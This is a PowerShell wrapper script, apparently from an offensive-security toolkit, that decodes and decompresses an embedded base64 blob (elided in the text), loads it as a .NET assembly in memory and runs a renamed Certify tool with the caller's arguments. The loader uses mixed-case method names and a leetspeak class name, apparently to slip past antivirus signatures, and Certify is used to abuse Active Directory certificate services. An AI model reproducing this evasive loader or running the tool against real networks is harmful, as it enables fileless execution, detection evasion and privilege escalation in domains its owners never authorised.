function Invoke-Certify
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = ""
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIA...BQA=")) # The omitted "H4sIA...BQA=" is actually a 11152596-character long Base64 string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [C3rt1fy.Program]::main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
